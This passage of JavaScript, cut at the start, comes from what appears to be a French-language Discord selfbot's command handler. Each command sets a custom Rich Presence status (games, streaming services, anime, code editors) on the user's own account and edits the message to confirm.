                .setDetails(`${args.slice(1).join(' ') || "R$Z Project"}`)
                .setStartTimestamp(Date.now())
                .setAssetsLargeImage(getExtendURL[0].external_asset_path)

            client.user.setPresence({activities: [status]})

            message.edit(`ガ __**${name} - Fall Guys**__ ガ\n> *Tu joues à \`${args.slice(1).join(' ') || "R$Z Project"}\` sur fall guys*`)
        }

        else if (cmd.slice(0, 1).join(' ') === (prefix + "rocket")){
            const getExtendURL = await discord.RichPresence.getExternal(client, '1219030452158075010', 'https://i.imgur.com/AlGLzOg.png');
            const status = new discord.RichPresence(client)
                .setApplicationId('1219030452158075010')
                .setState("R$Z PROJECT")
                .setType('PLAYING')
                .setName('Rocket League')
                .setStartTimestamp(Date.now())
                .setAssetsLargeImage(getExtendURL[0].external_asset_path)

            client.user.setPresence({activities: [status]})

            message.edit(`ガ __**${name} - Rocket League**__ ガ\n> *Tu joues à rocket league*`)
        }

        else if (cmd.slice(0, 1).join(' ') === (prefix + "league")){
            const getExtendURL = await discord.RichPresence.getExternal(client, '1219030452158075010', 'https://i.imgur.com/SzAa8XV.png');
            const status = new discord.RichPresence(client)
                .setApplicationId('1219030452158075010')
                .setType('PLAYING')
                .setDetails(`${args.join(' ') || "Faille de l'invocateur (classé)"}`)
                .setState("Dans un salon, prêt à jouer !")
                .setName('League of Legends')
                .setStartTimestamp(Date.now())
                .setParty({ current: 4, max: 5 })
                .setAssetsLargeImage(getExtendURL[0].external_asset_path)

            client.user.setPresence({activities: [status]})

            message.edit(`ガ __**${name} - League of Legends**__ ガ\n> *Tu joues à \`${args.join(' ') || "Faille de l'invocateur (classé)"}\` sur league of legends*`)
        }

        else if (cmd.slice(0, 1).join(' ') === (prefix + "valorant")){
            const getExtendURL = await discord.RichPresence.getExternal(client, '1219030452158075010', 'https://i.imgur.com/ytFgpQS.png');
            const status = new discord.RichPresence(client)
                .setApplicationId('1219030452158075010')
                .setState("R$Z PROJECT")
                .setType('PLAYING')
                .setName('Valorant')
                .setStartTimestamp(Date.now())
                .setAssetsLargeImage(getExtendURL[0].external_asset_path)

            client.user.setPresence({activities: [status]})

            message.edit(`ガ __**${name} - Valorant**__ ガ\n> *Tu joues à valorant*`)
        }

        else if (cmd.slice(0, 1).join(' ') === (prefix + "fivem")){
            const getExtendURL = await discord.RichPresence.getExternal(client, '1219030452158075010', 'https://i.imgur.com/qVN7wUx.png');
            const status = new discord.RichPresence(client)
                .setApplicationId('1219030452158075010')
                .setState("R$Z PROJECT")
                .setType('PLAYING')
                .setName('FiveM')
                .setDetails(`${args.join(' ') || `Playing on ${client.user.username} RP`}`)
                .setStartTimestamp(Date.now())
                .setAssetsLargeImage(getExtendURL[0].external_asset_path)
                .setParty({ current: 1500, max: 2048 })
            client.user.setPresence({activities: [status]})

            message.edit(`ガ __**${name} - FiveM**__ ガ\n> *Tu joues à \`${args.join(' ') || `Playing on ${client.user.username} RP`}\` sur fivem*`)
        }

        else if (cmd.slice(0, 1).join(' ') === (prefix + "gmod")){
            const getExtendURL = await discord.RichPresence.getExternal(client, '1219030452158075010', 'https://i.imgur.com/qPphNKn.png');
            const status = new discord.RichPresence(client)
                .setApplicationId('1219030452158075010')
                .setState("R$Z PROJECT")
                .setType('PLAYING')
                .setName('FiveM')
                .setDetails(`${args.join(' ') || `In ${client.user.username} - Best Server 👑`}`)
                .setStartTimestamp(Date.now())
                .setAssetsLargeImage(getExtendURL[0].external_asset_path)
            client.user.setPresence({activities: [status]})

            message.edit(`ガ __**${name} - Garry's Mod**__ ガ\n> *Tu joues à \`${args.join(' ') || `In ${client.user.username} - Best Server 👑`}\` sur garry's mod*`)
        }

        else if (cmd.slice(0, 1).join(' ') === (prefix + "gta5")){
            const getExtendURL = await discord.RichPresence.getExternal(client, '1219030452158075010', 'https://i.imgur.com/p8LYJna.png');
            const status = new discord.RichPresence(client)
                .setApplicationId('1219030452158075010')
                .setState("R$Z PROJECT")
                .setType('PLAYING')
                .setName('Grand Theft Auto V')
                .setStartTimestamp(Date.now())
                .setAssetsLargeImage(getExtendURL[0].external_asset_path)
            client.user.setPresence({activities: [status]})

            message.edit(`ガ __**${name} - Grand Theft Auto V**__ ガ\n> *Tu joues à GTA V*`)
        }

        else if (cmd.slice(0, 1).join(' ') === (prefix + "gta6")){
            const getExtendURL = await discord.RichPresence.getExternal(client, '1219030452158075010', 'https://i.imgur.com/iblrfgI.png');
            const status = new discord.RichPresence(client)
                .setApplicationId('1219030452158075010')
                .setState("R$Z PROJECT")
                .setType('PLAYING')
                .setName('Grand Theft Auto VI')
                .setStartTimestamp(Date.now())
                .setAssetsLargeImage(getExtendURL[0].external_asset_path)
            client.user.setPresence({activities: [status]})

            message.edit(`ガ __**${name} - Grand Theft Auto VI**__ ガ\n> *Tu joues à GTA VI*`)
        }

        else if (cmd.slice(0, 1).join(' ') === (prefix + "warzone")){
            const getExtendURL = await discord.RichPresence.getExternal(client, '1219030452158075010', 'https://i.imgur.com/tL7IYds.png');
            const status = new discord.RichPresence(client)
                .setApplicationId('1219030452158075010')
                .setState("R$Z PROJECT")
                .setType('PLAYING')
                .setName('Call of Duty® : Modern Warfare®')
                .setDetails(`${args.join(' ') || "Playing Warzone in Caldera"}`)
                .setStartTimestamp(Date.now())
                .setAssetsLargeImage(getExtendURL[0].external_asset_path)
            client.user.setPresence({activities: [status]})

            message.edit(`ガ __**${name} - Call of Duty® : Modern Warfare®**__ ガ\n> *Tu joues à \`${args.join(' ') || "Playing Warzone in Caldera"}\` sur Call of Duty Warzone*`)
        }

        else if (cmd.slice(0, 1).join(' ') === (prefix + "vsc")){
            const getExtendURL = await discord.RichPresence.getExternal(client, '1219030452158075010', 'https://i.imgur.com/a8b8GsC.png', 'https://i.imgur.com/9JRDR3k.png');
            const status = new discord.RichPresence(client)
                .setApplicationId('1219030452158075010')
                .setState("R$Z PROJECT")
                .setType('PLAYING')
                .setName('Visual Studio Code')
                .setDetails(`${args.join(' ') || "Editing index.js"}`)
                .setState("No workspace")
                .setStartTimestamp(Date.now())
                .setAssetsLargeImage(getExtendURL[0].external_asset_path)
                .setAssetsSmallImage(getExtendURL[1].external_asset_path)
            client.user.setPresence({activities: [status]})

            message.edit(`ガ __**${name} - Visual Studio Code**__ ガ\n> *Tu joues à \`${args.join(' ') || "Editing index.js"}\` sur Visual Studio Code*`)
        }

        else if (cmd.slice(0, 1).join(' ') === (prefix + "python")){
            const getExtendURL = await discord.RichPresence.getExternal(client, '1219030452158075010', 'https://i.imgur.com/pcYldPY.png', 'https://i.imgur.com/9JRDR3k.png');
            const status = new discord.RichPresence(client)
                .setApplicationId('1219030452158075010')
                .setState("R$Z PROJECT")
                .setType('PLAYING')
                .setName('Visual Studio Code')
                .setDetails(`${args.join(' ') || "Editing main.py"}`)
                .setState("No workspace")
                .setStartTimestamp(Date.now())
                .setAssetsLargeImage(getExtendURL[0].external_asset_path)
                .setAssetsSmallImage(getExtendURL[1].external_asset_path)
            client.user.setPresence({activities: [status]})

            message.edit(`ガ __**${name} - Visual Studio Code**__ ガ\n> *Tu joues à \`${args.join(' ') || "Editing main.py"}\` sur Visual Studio Code*`)
        }

        else if (cmd.slice(0, 1).join(' ') === (prefix + "destiny")){
            const getExtendURL = await discord.RichPresence.getExternal(client, '1219030452158075010', 'https://i.imgur.com/fl0qF0a.png');
            const status = new discord.RichPresence(client)
                .setApplicationId('1219030452158075010')
                .setState("R$Z PROJECT")
                .setType('PLAYING')
                .setName('Destiny 2')
                .setDetails(`${args.join(' ') || "Espace Social: La Tour"}`)
                .setStartTimestamp(Date.now())
                .setAssetsLargeImage(getExtendURL[0].external_asset_path)
            client.user.setPresence({activities: [status]})

            message.edit(`ガ __**${name} - Destiny 2**__ ガ\n> *Tu joues à \`${args.join(' ') || "Espace Social: La Tour"}\` sur Destiny 2*`)
        }

        else if (cmd.slice(0, 1).join(' ') === (prefix + "twitch")){
            const getExtendURL = await discord.RichPresence.getExternal(client, '1219030452158075010', 'https://i.imgur.com/WHkwnrM.png');
            const status = new discord.RichPresence(client)
                .setApplicationId('1219030452158075010')
                .setState("R$Z PROJECT")
                .setType('WATCHING')
                .setName('Twitch')
                .setDetails(`${args.join(' ') || "Searching..."}`)
                .setStartTimestamp(Date.now())
                .setAssetsLargeImage(getExtendURL[0].external_asset_path)
            client.user.setPresence({activities: [status]})

            message.edit(`ガ __**${name} - Twitch**__ ガ\n> *Tu regardes \`${args.join(' ') || "Searching..."}\` sur twitch*`)
        }

        else if (cmd.slice(0, 1).join(' ') === (prefix + "apex")){
            const getExtendURL = await discord.RichPresence.getExternal(client, '1219030452158075010', 'https://i.imgur.com/xYo8SYS.png');
            const status = new discord.RichPresence(client)
                .setApplicationId('1219030452158075010')
                .setState("R$Z PROJECT")
                .setType('PLAYING')
                .setName('Apex Legends')
                .setDetails(args.join(' ') || null)
                .setStartTimestamp(Date.now())
                .setAssetsLargeImage(getExtendURL[0].external_asset_path)
            client.user.setPresence({activities: [status]})

            message.edit(`ガ __**${name} - Apex Legends**__ ガ\n> *Tu joues à ${args[0] ? `\`${args.join(' ')}\` sur `: ""}apex legends*`)
        }

        else if (cmd.slice(0, 1).join(' ') === (prefix + "netflix")){
            const getExtendURL = await discord.RichPresence.getExternal(client, '1219030452158075010', 'https://i.imgur.com/VDnyBX4.png');
            const status = new discord.RichPresence(client)
                .setApplicationId('1219030452158075010')
                .setState("R$Z PROJECT")
                .setType('WATCHING')
                .setName('Netflix')
                .setDetails(args.join(' ') || "S1:E1")
                .setStartTimestamp(Date.now())
                .setAssetsLargeImage(getExtendURL[0].external_asset_path)
            client.user.setPresence({activities: [status]})

            message.edit(`ガ __**${name} - Netflix**__ ガ\n> *Tu regardes \`${args.join(' ') || "S1:E1"}\` sur netflix*`)
        }

        else if (cmd.slice(0, 1).join(' ') === (prefix + "ph")){
            const getExtendURL = await discord.RichPresence.getExternal(client, '1219030452158075010', 'https://i.imgur.com/yeTFMA8.png');
            const status = new discord.RichPresence(client)
                .setApplicationId('1219030452158075010')
                .setState("R$Z PROJECT")
                .setType('WATCHING')
                .setName('Pornhub')
                .setDetails(args.join(' ') || "R$Z Project")
                .setStartTimestamp(Date.now())
                .setAssetsLargeImage(getExtendURL[0].external_asset_path)
            client.user.setPresence({activities: [status]})

            message.edit(`ガ __**${name} - Pornhub**__ ガ\n> *Tu regardes \`${args.join(' ') || "R$Z Project"}\` sur pornhub*`)
        }

        else if (cmd.slice(0, 1).join(' ') === (prefix + "disney+")){
            const getExtendURL = await discord.RichPresence.getExternal(client, '1219030452158075010', 'https://i.imgur.com/adUCcaA.png');
            const status = new discord.RichPresence(client)
                .setApplicationId('1219030452158075010')
                .setState("R$Z PROJECT")
                .setType('WATCHING')
                .setName('Disney+')
                .setDetails(args.join(' ') || "On Disney+")
                .setStartTimestamp(Date.now())
                .setAssetsLargeImage(getExtendURL[0].external_asset_path)
            client.user.setPresence({activities: [status]})

            message.edit(`ガ __**${name} - Disney+**__ ガ\n> *Tu regardes \`${args.join(' ') || "On Disney+"}\` sur disney+*`)
        }

        else if (cmd.slice(0, 1).join(' ') === (prefix + "fifa23")){
            const getExtendURL = await discord.RichPresence.getExternal(client, '1219030452158075010', 'https://i.imgur.com/yLg8ity.png');
            const status = new discord.RichPresence(client)
                .setApplicationId('1219030452158075010')
                .setState("R$Z PROJECT")
                .setType('PLAYING')
                .setName('Fifa 23')
                .setDetails(args.join(' ') || "#EA")
                .setStartTimestamp(Date.now())
                .setAssetsLargeImage(getExtendURL[0].external_asset_path)
            client.user.setPresence({activities: [status]})

            message.edit(`ガ __**${name} - Fifa 23**__ ガ\n> *Tu joues à \`${args.join(' ') || "#EA"}\` sur fifa 23*`)
        }

        else if (cmd.slice(0, 1).join(' ') === (prefix + "fc24")){
            const getExtendURL = await discord.RichPresence.getExternal(client, '1219030452158075010', 'https://i.imgur.com/DbT2hvN.png');
            const status = new discord.RichPresence(client)
                .setApplicationId('1219030452158075010')
                .setState("R$Z PROJECT")
                .setType('PLAYING')
                .setName('FC 24')
                .setDetails(args.join(' ') || "#EA")
                .setStartTimestamp(Date.now())
                .setAssetsLargeImage(getExtendURL[0].external_asset_path)
            client.user.setPresence({activities: [status]})

            message.edit(`ガ __**${name} - FC 24**__ ガ\n> *Tu joues à \`${args.join(' ') || "#EA"}\` sur FC 24*`)
        }

        else if (cmd.slice(0, 1).join(' ') === (prefix + "ubereat")){
            const getExtendURL = await discord.RichPresence.getExternal(client, '1219030452158075010', 'https://i.imgur.com/wEvZfZC.png');
            const status = new discord.RichPresence(client)
                .setApplicationId('1219030452158075010')
                .setState("R$Z PROJECT")
                .setType('PLAYING')
                .setName('UBER EATS')
                .setDetails(args.join(' ') || "On Uber Eats")
                .setStartTimestamp(Date.now())
                .setAssetsLargeImage(getExtendURL[0].external_asset_path)
            client.user.setPresence({activities: [status]})

            message.edit(`ガ __**${name} - UBER EATS**__ ガ\n> *Tu joues à \`${args.join(' ') || "On Uber Eats"}\` sur Uber Eats*`)
        }

        else if (cmd.slice(0, 1).join(' ') === (prefix + "photoshop")){
            const getExtendURL = await discord.RichPresence.getExternal(client, '1219030452158075010', 'https://i.imgur.com/sOfYqRq.png');
            const status = new discord.RichPresence(client)
                .setApplicationId('1219030452158075010')
                .setState("R$Z PROJECT")
                .setType('PLAYING')
                .setName('Photoshop')
                .setDetails("Editing: " + args.join(' ') || "RSZ.psd")
                .setStartTimestamp(Date.now())
                .setAssetsLargeImage(getExtendURL[0].external_asset_path)
            client.user.setPresence({activities: [status]})

            message.edit(`ガ __**${name} - Photoshop**__ ガ\n> *Tu joues à \`Editing: ${args.join(' ') || "RSZ.psd"}\` sur photoshop*`)
        }

        else if (cmd.slice(0, 1).join(' ') === (prefix + "kali")){
            const getExtendURL = await discord.RichPresence.getExternal(client, '1219030452158075010', 'https://i.imgur.com/i1HdhRT.png');
            const status = new discord.RichPresence(client)
                .setApplicationId('1219030452158075010')
                .setState("R$Z PROJECT")
                .setType('COMPETING')
                .setName('KALI LINUX')
                .setDetails("Terminal: " + args.join(' ') || "R$Z")
                .setStartTimestamp(Date.now())
                .setAssetsLargeImage(getExtendURL[0].external_asset_path)
            client.user.setPresence({activities: [status]})

            message.edit(`ガ __**${name} - Kali Linux**__ ガ\n> *Tu participes à \`Terminal: ${args.join(' ') || "R$Z"}\` sur kali linux*`)
        }

        else if (cmd.slice(0, 1).join(' ') === (prefix + "arch")){
            const getExtendURL = await discord.RichPresence.getExternal(client, '1219030452158075010', 'https://i.imgur.com/rTbbZP6.png');
            const status = new discord.RichPresence(client)
                .setApplicationId('1219030452158075010')
                .setState("R$Z PROJECT")
                .setType('COMPETING')
                .setName('ARCH LINUX')
                .setDetails("Terminal: " + args.join(' ') || "R$Z")
                .setStartTimestamp(Date.now())
                .setAssetsLargeImage(getExtendURL[0].external_asset_path)
            client.user.setPresence({activities: [status]})

            message.edit(`ガ __**${name} - Arch Linux**__ ガ\n> *Tu participes à \`Terminal: ${args.join(' ') || "R$Z"}\` sur arch linux*`)
        }

        else if (cmd.slice(0, 1).join(' ') === (prefix + "punchnox")){
            const getExtendURL = await discord.RichPresence.getExternal(client, '1219030452158075010', 'https://i.imgur.com/5zU8Yq5.png');
            const status = new discord.RichPresence(client)
                .setApplicationId('1219030452158075010')
                .setType('PLAYING')
                .setName('𝙋𝙪𝙣𝙘𝙝𝙣𝙤𝙭-𝙋𝙧𝙤𝙟𝙚𝙘𝙩-𝙥𝙧𝙚𝙢𝙞𝙪𝙢')
                .setState(`version 3.0.9`)
                .setDetails("dev by punchnox")
                .setStartTimestamp(Date.now())
                .setAssetsLargeImage(getExtendURL[0].external_asset_path)
            client.user.setPresence({activities: [status]})

            message.edit(`ガ __**${name} - Punchnox**__ ガ\n> *Tu joues à punchnox*`)
        }

        else if (cmd.slice(0, 1).join(' ') === (prefix + "tomori")){
            const getExtendURL = await discord.RichPresence.getExternal(client, '1219030452158075010', 'https://i.imgur.com/d48XdQH.jpeg');
            const status = new discord.RichPresence(client)
                .setApplicationId('1219030452158075010')
                .setType('STREAMING')
                .setURL(twitch)
                .setName('𝓣𝓸𝓶𝓸𝓻𝓲 𝓟𝓡𝓞𝓙𝓔𝓒𝓣')
                .setDetails('𝓣𝓸𝓶𝓸𝓻𝓲 𝓟𝓡𝓞𝓙𝓔𝓒𝓣')
                .setState("dév par Fubukii")
                .setStartTimestamp(Date.now())
                .setAssetsLargeImage(getExtendURL[0].external_asset_path)
            client.user.setPresence({activities: [status]})

            message.edit(`ガ __**${name} - Tomori**__ ガ\n> *Tu streams Tomori*`)
        }

        else if (cmd.slice(0, 1).join(' ') === (prefix + "wfa")){
            const getExtendURL = await discord.RichPresence.getExternal(client, '1219030452158075010', 'https://i.imgur.com/yQcAN40.png');
            const status = new discord.RichPresence(client)
                .setApplicationId('1219030452158075010')
                .setType('STREAMING')
                .setURL(twitch)
                .setName('WFA SELFBOT')
                .setDetails('WFA Selfbot')
                .setState('𝐖𝐞 𝐅𝐮𝐜𝐤 𝐀𝐥𝐥')
                .setStartTimestamp(Date.now())
                .setAssetsLargeImage(getExtendURL[0].external_asset_path)
            client.user.setPresence({activities: [status]})

            message.edit(`ガ __**${name} - WFA**__ ガ\n> *Tu streams WFA*`)
        }

        else if (cmd.slice(0, 1).join(' ') === (prefix + "delta")){
            const getExtendURL = await discord.RichPresence.getExternal(client, '1219030452158075010', 'https://i.imgur.com/NzfyyKV.png');
            const status = new discord.RichPresence(client)
                .setApplicationId('1219030452158075010')
                .setType('STREAMING')
                .setURL(twitch)
                .setName('Delta-Selfbot E')
                .setDetails('Delta Selfbot')
                .setState("Utilise le Delta Selfbot")
                .setStartTimestamp(Date.now())
                .setAssetsLargeImage(getExtendURL[0].external_asset_path)
            client.user.setPresence({activities: [status]})

            message.edit(`ガ __**${name} - Delta**__ ガ\n> *Tu streams Delta*`)
        }

        else if (cmd.slice(0, 1).join(' ') === (prefix + "alucard")){
            const getExtendURL = await discord.RichPresence.getExternal(client, '1219030452158075010', 'https://i.imgur.com/hTo9Md3.png');
            const status = new discord.RichPresence(client)
                .setApplicationId('1219030452158075010')
                .setType('STREAMING')
                .setURL(twitch)
                .setName('Alucard')
                .setStartTimestamp(Date.now())
                .setAssetsLargeImage(getExtendURL[0].external_asset_path)
            client.user.setPresence({activities: [status]})

            message.edit(`ガ __**${name} - WFA**__ ガ\n> *Tu joues à WFA*`)
        }

        else if (cmd.slice(0, 1).join(' ') === (prefix + "speed")){
            const getExtendURL = await discord.RichPresence.getExternal(client, '1219030452158075010', 'https://i.imgur.com/ZWfwDa4.png');
            const status = new discord.RichPresence(client)
                .setApplicationId('1219030452158075010')
                .setType('COMPETING')
                .setName('SPEED')
                .setDetails("Speed")
                .setState("⛧")
                .setStartTimestamp(Date.now())
                .setAssetsLargeImage(getExtendURL[0].external_asset_path)
            client.user.setPresence({activities: [status]})

            message.edit(`ガ __**${name} - Speed**__ ガ\n> *Tu participes à SPEED*`)
        }

        else if (cmd.slice(0, 1).join(' ') === (prefix + "1337")){
            const getExtendURL = await discord.RichPresence.getExternal(client, '1219030452158075010', 'https://i.imgur.com/hR9dxrf.png');
            const status = new discord.RichPresence(client)
                .setApplicationId('1219030452158075010')
                .setType('COMPETING')
                .setName('1774')
                .setDetails("1774")
                .setState("⛧")
                .setStartTimestamp(Date.now())
                .setAssetsLargeImage(getExtendURL[0].external_asset_path)
            client.user.setPresence({activities: [status]})

            message.edit(`ガ __**${name} - Speed**__ ガ\n> *Tu participes à 1774*`)
        }

        else if (cmd.slice(0, 1).join(' ') === (prefix + "crunchyroll")){
            const getExtendURL = await discord.RichPresence.getExternal(client, '1219030452158075010', 'https://i.imgur.com/1YtyEJ1.png');
            const status = new discord.RichPresence(client)
                .setApplicationId('1219030452158075010')
                .setType('WATCHING')
                .setName('Crunchyroll')
                .setDetails('Crunchyroll')
                .setState(args.join(' ') || "R$Z Selfbot")
                .setStartTimestamp(Date.now())
                .setAssetsLargeImage(getExtendURL[0].external_asset_path)
            client.user.setPresence({activities: [status]})

            message.edit(`ガ __**${name} - Crunchyroll**__ ガ\n> *Tu regardes \`${args.join(' ') || "R$Z Selfbot"}\` sur crunchyroll*`)
        }

        else if (cmd.slice(0, 1).join(' ') === (prefix + "adn")){
            const getExtendURL = await discord.RichPresence.getExternal(client, '1219030452158075010', 'https://i.imgur.com/SPYm3T6.png');
            const status = new discord.RichPresence(client)
                .setApplicationId('1219030452158075010')
                .setType('WATCHING')
                .setName('Anime Digital Network')
                .setDetails('Anime Digital Network')
                .setState(args.join(' ') || "R$Z Selfbot")
                .setStartTimestamp(Date.now())
                .setAssetsLargeImage(getExtendURL[0].external_asset_path)
            client.user.setPresence({activities: [status]})

            message.edit(`ガ __**${name} - ADN**__ ガ\n> *Tu regardes \`${args.join(' ') || "R$Z Selfbot"}\` sur Anime Digital Network*`)
        }

        else if (cmd.slice(0, 2).join(' ') === (prefix + "anime sama")){
            const getExtendURL = await discord.RichPresence.getExternal(client, '1219030452158075010', 'https://i.imgur.com/2mebvR9.png');
            const status = new discord.RichPresence(client)
                .setApplicationId('1219030452158075010')
                .setType('WATCHING')
                .setName('Anime Sama')
                .setDetails('Anime Sama')
                .setState(args.join(' ') || "R$Z Selfbot")
                .setStartTimestamp(Date.now())
                .setAssetsLargeImage(getExtendURL[0].external_asset_path)
            client.user.setPresence({activities: [status]})

            message.edit(`ガ __**${name} - Anime Sama**__ ガ\n> *Tu regardes \`${args.join(' ') || "R$Z Selfbot"}\` sur Anime Sama*`)
        }

        else if (cmd.slice(0, 1).join(' ') === (prefix + "wakanim")){
            const getExtendURL = await discord.RichPresence.getExternal(client, '1219030452158075010', 'https://i.imgur.com/2B1ze71.png');
            const status = new discord.RichPresence(client)
                .setApplicationId('1219030452158075010')
                .setType('WATCHING')
                .setName('Wakanim')
                .setDetails('Wakanim')
                .setState(args.join(' ') || "R$Z Selfbot")
                .setStartTimestamp(Date.now())
                .setAssetsLargeImage(getExtendURL[0].external_asset_path)
            client.user.setPresence({activities: [status]})

            message.edit(`ガ __**${name} - Wakanim**__ ガ\n> *Tu regardes \`${args.join(' ') || "R$Z Selfbot"}\` sur Wakanim*`)
        }

        else if (cmd.slice(0, 1).join(' ') === (prefix + "hxh")){
            const getExtendURL = await discord.RichPresence.getExternal(client, '1219030452158075010', 'https://i.imgur.com/ksfEMsm.png');
            const status = new discord.RichPresence(client)
                .setApplicationId('1219030452158075010')
                .setType('PLAYING')
                .setName('Hunter X Hunter')
                .setDetails('Hunter X Hunter')
                .setState(args.join(' ') || "R$Z Selfbot")
                .setStartTimestamp(Date.now())
                .setAssetsLargeImage(getExtendURL[0].external_asset_path)
            client.user.setPresence({activities: [status]})

            message.edit(`ガ __**${name} - Hunter X Hunter**__ ガ\n> *Tu joues à \`${args.join(' ') || "R$Z Selfbot"}\` sur hunter X hunter*`)
        }

        else if (cmd.slice(0, 2).join(' ') === (prefix + "black clover")){
            const getExtendURL = await discord.RichPresence.getExternal(client, '1219030452158075010', 'https://i.imgur.com/Bo3X7IZ.png');
            const status = new discord.RichPresence(client)
                .setApplicationId('1219030452158075010')
                .setType('PLAYING')
                .setName('Black Clover')
                .setDetails('Black Clover')
                .setState(args.join(' ') || "R$Z Selfbot")
                .setStartTimestamp(Date.now())
                .setAssetsLargeImage(getExtendURL[0].external_asset_path)
            client.user.setPresence({activities: [status]})

            message.edit(`ガ __**${name} - Black Clover**__ ガ\n> *Tu joues à \`${args.join(' ') || "R$Z Selfbot"}\` sur black clover*`)
        }

        else if (cmd.slice(0, 1).join(' ') === (prefix + "naruto")){
            const getExtendURL = await discord.RichPresence.getExternal(client, '1219030452158075010', 'https://i.imgur.com/8w1agER.png');
            const status = new discord.RichPresence(client)
                .setApplicationId('1219030452158075010')
                .setType('PLAYING')
                .setName('Naruto')
                .setDetails('Naruto')
                .setState(args.join(' ') || "R$Z Selfbot")
                .setStartTimestamp(Date.now())
                .setAssetsLargeImage(getExtendURL[0].external_asset_path)
            client.user.setPresence({activities: [status]})

            message.edit(`ガ __**${name} - Naruto**__ ガ\n> *Tu joues à \`${args.join(' ') || "R$Z Selfbot"}\` sur naruto*`)
        }

        else if (cmd.slice(0, 2).join(' ') === (prefix + "one piece")){
            const getExtendURL = await discord.RichPresence.getExternal(client, '1219030452158075010', 'https://i.imgur.com/JBCXw71.png');
            const status = new discord.RichPresence(client)
                .setApplicationId('1219030452158075010')
                .setType('PLAYING')
                .setName('One Piece')
                .setDetails('One Piece')
                .setState(args.join(' ') || "R$Z Selfbot")
                .setStartTimestamp(Date.now())
                .setAssetsLargeImage(getExtendURL[0].external_asset_path)
            client.user.setPresence({activities: [status]})

            message.edit(`ガ __**${name} - One Piece**__ ガ\n> *Tu joues à \`${args.join(' ') || "R$Z Selfbot"}\` sur one piece*`)
        }

        else if (cmd.slice(0, 1).join(' ') === (prefix + "haikyuu")){
            const getExtendURL = await discord.RichPresence.getExternal(client, '1219030452158075010', 'https://i.imgur.com/FER6lIv.png');
            const status = new discord.RichPresence(client)
                .setApplicationId('1219030452158075010')
                .setType('PLAYING')
                .setName('Haikyuu')
                .setDetails('Haikyuu')
                .setState(args.join(' ') || "R$Z Selfbot")
                .setStartTimestamp(Date.now())
                .setAssetsLargeImage(getExtendURL[0].external_asset_path)
            client.user.setPresence({activities: [status]})

            message.edit(`ガ __**${name} - Haikyuu**__ ガ\n> *Tu joues à \`${args.join(' ') || "R$Z Selfbot"}\` sur haikyuu*`)
        }

        else if (cmd.slice(0, 1).join(' ') === (prefix + "cote")){
            const getExtendURL = await discord.RichPresence.getExternal(client, '1219030452158075010', 'https://i.imgur.com/6KSmOyM.png');
            const status = new discord.RichPresence(client)
                .setApplicationId('1219030452158075010')
                .setType('PLAYING')
                .setName('Classroom of the Elite')
                .setDetails('Classroom of the Elite')
                .setState(args.join(' ') || "R$Z Selfbot")
                .setStartTimestamp(Date.now())
                .setAssetsLargeImage(getExtendURL[0].external_asset_path)
            client.user.setPresence({activities: [status]})

            message.edit(`ガ __**${name} - Classroom of the Elite**__ ガ\n> *Tu joues à \`${args.join(' ') || "R$Z Selfbot"}\` sur classroom of the elite*`)
        }

        else if (cmd.slice(0, 2).join(' ') === (prefix + "code geass")){
            const getExtendURL = await discord.RichPresence.getExternal(client, '1219030452158075010', 'https://i.imgur.com/aJtoOrP.png');
            const status = new discord.RichPresence(client)
                .setApplicationId('1219030452158075010')
                .setType('PLAYING')
                .setName('Code Geass')
                .setDetails('Code Geass')
                .setState(args.join(' ') || "R$Z Selfbot")
                .setStartTimestamp(Date.now())
                .setAssetsLargeImage(getExtendURL[0].external_asset_path)
            client.user.setPresence({activities: [status]})

            message.edit(`ガ __**${name} - Code Geass**__ ガ\n> *Tu joues à \`${args.join(' ') || "R$Z Selfbot"}\` sur code geass*`)
        }

        else if (cmd.slice(0, 1).join(' ') === (prefix + "darling")){
            const getExtendURL = await discord.RichPresence.getExternal(client, '1219030452158075010', 'https://i.imgur.com/2yY6ufO.png');
            const status = new discord.RichPresence(client)
                .setApplicationId('1219030452158075010')
                .setType('PLAYING')
                .setName('Darling in the FranXX')
                .setDetails('Darling in the FranXX')
                .setState(args.join(' ') || "R$Z Selfbot")
                .setStartTimestamp(Date.now())
                .setAssetsLargeImage(getExtendURL[0].external_asset_path)
            client.user.setPresence({activities: [status]})

            message.edit(`ガ __**${name} - Darling in the FranXX**__ ガ\n> *Tu joues à \`${args.join(' ') || "R$Z Selfbot"}\` sur darling in the franxx*`)
        }

        else if (cmd.slice(0, 1).join(' ') === (prefix + "sao")){
            const getExtendURL = await discord.RichPresence.getExternal(client, '1219030452158075010', 'https://i.imgur.com/ohcmQon.png');
            const status = new discord.RichPresence(client)
                .setApplicationId('1219030452158075010')
                .setType('PLAYING')
                .setName('Sword Art Online')
                .setDetails('Sword Art Online')
                .setState(args.join(' ') || "R$Z Selfbot")
                .setStartTimestamp(Date.now())
                .setAssetsLargeImage(getExtendURL[0].external_asset_path)
            client.user.setPresence({activities: [status]})

            message.edit(`ガ __**${name} - Sword Art Online**__ ガ\n> *Tu joues à \`${args.join(' ') || "R$Z Selfbot"}\` sur sword art online*`)
        }

        else if (cmd.slice(0, 1).join(' ') === (prefix + "mha")){
            const getExtendURL = await discord.RichPresence.getExternal(client, '1219030452158075010', 'https://i.imgur.com/LvqwAgW.png');
            const status = new discord.RichPresence(client)
                .setApplicationId('1219030452158075010')
                .setType('PLAYING')
                .setName('My Hero Academia')
                .setDetails('My Hero Academia')
                .setState(args.join(' ') || "R$Z Selfbot")
                .setStartTimestamp(Date.now())
                .setAssetsLargeImage(getExtendURL[0].external_asset_path)
            client.user.setPresence({activities: [status]})

            message.edit(`ガ __**${name} - My Hero Academia**__ ガ\n> *Tu joues à \`${args.join(' ') || "R$Z Selfbot"}\` sur my hero academia*`)
        }

        else if (cmd.slice(0, 1).join(' ') === (prefix + "ngnl")){
            const getExtendURL = await discord.RichPresence.getExternal(client, '1219030452158075010', 'https://i.imgur.com/qLMCYYs.png');
            const status = new discord.RichPresence(client)
                .setApplicationId('1219030452158075010')
                .setType('PLAYING')
                .setName('No Game No Life')
                .setDetails('No Game No Life')
                .setState(args.join(' ') || "R$Z Selfbot")
                .setStartTimestamp(Date.now())
                .setAssetsLargeImage(getExtendURL[0].external_asset_path)
            client.user.setPresence({activities: [status]})

            message.edit(`ガ __**${name} - No Game No Life**__ ガ\n> *Tu joues à \`${args.join(' ') || "R$Z Selfbot"}\` sur no game no life*`)
        }

        else if (cmd.slice(0, 2).join(' ') === (prefix + "brawl stars")){
            client.user.setSamsungActivity(games['brawl-stars'], "START")
            message.edit(`ガ __**${name} - Samsung Status**__ ガ\n> *Tu joues maintenant à Brawl Stars*`)
        }

